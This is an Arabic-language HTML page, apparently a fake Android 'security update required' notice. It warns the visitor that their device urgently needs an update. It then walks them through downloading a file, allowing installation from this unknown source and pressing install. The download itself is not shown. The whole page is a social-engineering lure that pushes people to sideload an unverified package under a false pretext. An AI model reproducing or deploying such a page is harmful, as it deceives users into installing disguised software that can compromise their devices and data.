<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تحديث الأمان</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="icon-wrap">
        <svg width="64" height="64" viewBox="0 0 24 24" fill="#1f6feb">
          <path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85-.29-.15-.65-.06-.83.22l-1.88 3.24a11.46 11.46 0 0 0-8.94 0L5.65 5.67c-.19-.29-.58-.38-.87-.2-.28.18-.37.54-.22.83L6.4 9.48A10.81 10.81 0 0 0 1 18h22a10.81 10.81 0 0 0-5.4-8.52zM7 15.25a1.25 1.25 0 1 1 0-2.5 1.25 1.25 0 0 1 0 2.5zm10 0a1.25 1.25 0 1 1 0-2.5 1.25 1.25 0 0 1 0 2.5z"/>
        </svg>
      </div>
      <h1>تحديث الأمان مطلوب</h1>
      <p class="sub">جهازك يحتاج تحديثاً أمنياً عاجلاً لحماية بياناتك</p>

      <div class="steps">
        <div class="step"><span class="num">1</span> اضغط زر التحميل أدناه</div>
        <div class="step"><span class="num">2</span> افتح الملف بعد التنزيل</div>
        <div class="step"><span class="num">3</span> اسمح بالتثبيت من هذا المصدر</div>
        <div class="step"><span class="num">4</span> اضغط "تثبيت" وانتظر</div>
      </div>

      <a href="/download" class="btn-download" id="dl">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 16l-6-6h4V4h4v6h4l-6 6zm-8 2h16v2H4z"/>
        </svg>
        تحميل التحديث
      </a>
      <p class="hint">آخر تحديث: اليوم</p>
    </div>
  </div>

  <script>
    document.getElementById('dl').addEventListener('click', () => {
      const b = document.getElementById('dl');
      b.innerHTML = 'جارٍ التحميل...';
      b.style.opacity = '0.7';
    });
  </script>
</body>
</html>
